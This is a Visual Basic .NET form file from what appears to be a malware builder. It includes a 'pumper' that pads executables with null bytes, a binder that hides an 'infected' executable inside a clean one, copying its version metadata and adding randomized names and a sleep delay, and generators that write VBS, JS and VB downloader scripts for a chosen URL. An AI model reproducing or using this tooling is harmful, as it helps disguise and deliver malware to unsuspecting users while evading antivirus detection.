
Imports System.CodeDom.Compiler
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Public Class Form8

    Public Property code As Object

    Public Shared Function String2Hex(input As String) As String
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim i As Integer = 0
        Dim length As Integer = input.Length

        While i < length
            Dim [string] As String = Conversions.ToString(input(i))
            Dim str As String = Conversion.Hex(Strings.Asc([string]))
            stringBuilder.Append(str + " ")
            i += 1
        End While
        Return stringBuilder.ToString().Substring(0, stringBuilder.Length - 1)
    End Function

    Private Sub Buttonpumperexp_Click(sender As Object, e As EventArgs) Handles Buttonpumperexp.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Exe Files|*.exe"
        ofd.ShowDialog()
        TextBoxpayload.Text = ofd.FileName
    End Sub

    Private Sub Buttonpumper_Click(sender As Object, e As EventArgs) Handles Buttonpumper.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "Exe Files|*.exe"
        sfd.ShowDialog()
        Dim filesize As Double = Val(NumericUpDown1.Value)
        IO.File.Copy(TextBoxpayload.Text, sfd.FileName)
        If RadioButton1.Checked Then
            filesize = filesize * 1024
        End If
        If RadioButton2.Checked Then
            filesize = filesize * 1048576
        End If
        Dim filetopump = IO.File.OpenWrite(sfd.FileName)
        Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
        While size < filesize
            filetopump.WriteByte(0)
            size += 1
        End While
        ProgressBar3.Value = 0
        ProgressBar3.Value = 100
        filetopump.Close()
        MsgBox("Finish To Pump !")
    End Sub

    Private Sub AzenisButton1_Click(sender As Object, e As EventArgs) Handles AzenisButton1.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Exe Files|*.exe"
        ofd.ShowDialog()
        TextBoxfile1.Text = ofd.FileName
    End Sub

    Private Sub Buttonfile2exp_Click(sender As Object, e As EventArgs) Handles Buttonfile2exp.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Exe Files|*.exe"
        ofd.ShowDialog()
        TextBoxfile2.Text = ofd.FileName
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Call BinderFiles()
        ProgressBar4.Value = 0
        ProgressBar4.Value = 100
        MsgBox("Finish To Binde !")
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click


        If CheckBoxVBDownloader.CheckState = 1 Then

            Call Downloaderinfo()

        ElseIf CheckBoxVBDownloader.CheckState = 0 Then


        End If

        If CheckBoxVBSDownloader.CheckState = 1 Then

            Try
                If TextBoxdownloaderurl.Text = "" Or TextBofilenamedownlader.Text = "" Then
                    MessageBox.Show("One of mandatory fields left blank!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                Else
                    Dim RRR As String
                    Dim OOO As New SaveFileDialog
                    With OOO
                        .FileName = TextBofilenamedownlader.Text
                        .Filter = "vBS|*.vbs"
                        .ShowDialog()
                    End With
                    Dim TKTKTK As String = My.Resources.VBSDownlader
                    RRR = TKTKTK.Replace("%url%", TextBoxdownloaderurl.Text).Replace("%name%", TextBofilenamedownlader.Text)
                    System.IO.File.WriteAllText(OOO.FileName, RRR)
                    ProgressBar2.Value = 0
                    ProgressBar2.Value = 100
                    MessageBox.Show(OOO.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
            Catch ex As Exception

            End Try

        ElseIf CheckBoxVBSDownloader.CheckState = 0 Then

        End If


        If CheckBoxJSDownloader.CheckState = 1 Then

            Try
                If TextBoxdownloaderurl.Text = "" Or TextBofilenamedownlader.Text = "" Then
                    MessageBox.Show("One of mandatory fields left blank!!", "ERROR!", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                Else
                    Dim RWRWRWRW As String
                    Dim UTUTTUT As New SaveFileDialog
                    With UTUTTUT
                        .FileName = TextBofilenamedownlader.Text
                        .Filter = "js|*.js"
                        .ShowDialog()
                    End With
                    Dim TJTJTJ As String = My.Resources.JSDownloader
                    RWRWRWRW = TJTJTJ.Replace("%url%", TextBoxdownloaderurl.Text).Replace("%name%", TextBofilenamedownlader.Text)
                    System.IO.File.WriteAllText(UTUTTUT.FileName, RWRWRWRW)
                    ProgressBar2.Value = 0
                    ProgressBar2.Value = 100
                    MessageBox.Show(UTUTTUT.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
            Catch ex As Exception

            End Try

        ElseIf CheckBoxJSDownloader.CheckState = 0 Then


        End If
    End Sub

    Sub BinderFiles()
        ExeBind(TextBoxfile1.Text, TextBoxfile2.Text) 'Binds a copy of SpookyExe to CleanExe
    End Sub

    Sub ExeBind(ByVal infile As String, ByVal infectedfile As String)
        Dim Info As FileVersionInfo
        Info = FileVersionInfo.GetVersionInfo(infile)
        Dim source As String = My.Resources.String1
        source = source.Replace("%GoodFileCodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileCodedBytes%", random_key(GetRandom(10)))
        source = source.Replace("%GoodFileBytes%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileBytes%", random_key(GetRandom(10)))
        source = source.Replace("%GoodFileName%", random_key(GetRandom(10)))
        source = source.Replace("%BadFileName%", random_key(GetRandom(10)))
        source = source.Replace("%SleeperValue%", GetRandom(1000) + 1000)
        source = source.Replace("%ProductName%", Info.ProductName)
        source = source.Replace("%FileDescription%", Info.FileDescription)
        source = source.Replace("%CompanyName%", Info.CompanyName)
        source = source.Replace("%ProductName%", Info.ProductName)
        source = source.Replace("%LegalCopyright%", Info.LegalCopyright)
        source = source.Replace("%LegalTrademarks%", Info.LegalTrademarks)
        source = source.Replace("%FileVersion%", Info.FileVersion)
        source = source.Replace("%ProductVersion%", Info.ProductVersion)
        source = source.Replace("%goodfile%", format(IO.File.ReadAllBytes(infile)))
        source = source.Replace("%badfile%", format(IO.File.ReadAllBytes(infectedfile)))
        iCompiler.GenerateExecutable(infile, source, "")
    End Sub

    Function GetRandom(ByVal range As Integer)
        Randomize()
        Return CInt(Math.Ceiling(Rnd() * range))
    End Function

    Public Class iCompiler
        Public Shared Sub GenerateExecutable(ByVal Output As String, ByVal Source As String, ByVal Icon As String)
            Dim Compiler As New VBCodeProvider
            Dim Parameters As New CompilerParameters()
            Dim cResults As CompilerResults
            Parameters.GenerateExecutable = True
            Parameters.OutputAssembly = Output
            Parameters.ReferencedAssemblies.Add("System.dll")
            Parameters.ReferencedAssemblies.Add("System.Data.dll")
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
            Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
            Parameters.CompilerOptions = "/t:winexe"
            cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        End Sub
    End Class
    Function format(ByVal input As Byte()) As String 'Line bypassing for codedom based apps. thanks prototype
        Dim out As New System.Text.StringBuilder
        Dim base64data As String = Convert.ToBase64String(input)
        Dim arr As String() = SplitString(base64data, 50000)
        For i As Integer = 0 To arr.Length - 1
            If i = arr.Length - 1 Then
                out.Append(Chr(34) & arr(i) & Chr(34))
            Else
                out.Append(Chr(34) & arr(i) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return out.ToString
    End Function
    Function SplitString(ByVal input As String, ByVal partsize As Long) As String() 'Splitting strings . thanks to prototype
        Dim amount As Long = Math.Ceiling(input.Length / partsize)
        Dim out(amount - 1) As String
        Dim currentpos As Long = 0
        For I As Integer = 0 To amount - 1
            If I = amount - 1 Then
                Dim temp((input.Length - currentpos) - 1) As Char
                input.CopyTo(currentpos, temp, 0, (input.Length - currentpos))
                out(I) = Convert.ToString(temp)
            Else
                Dim temp(partsize - 1) As Char
                input.CopyTo(currentpos, temp, 0, partsize)
                out(I) = Convert.ToString(temp)
                currentpos += partsize
            End If
        Next
        Return out
    End Function
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Sub Downloaderinfo()

        code = code.Replace("%url%", String2Hex(TextBoxdownloaderurl.Text))
        Dim c As New SaveFileDialog
        With c
            .FileName = TextBofilenamedownlader.Text
            .Filter = "vb|*.VB"
            .ShowDialog()
        End With
        System.IO.File.WriteAllText(c.FileName, code)
        MessageBox.Show("successfully : " & c.FileName, "DONE!", MessageBoxButtons.OK, MessageBoxIcon.Information)

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Me.Close()
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
    End Sub
End Class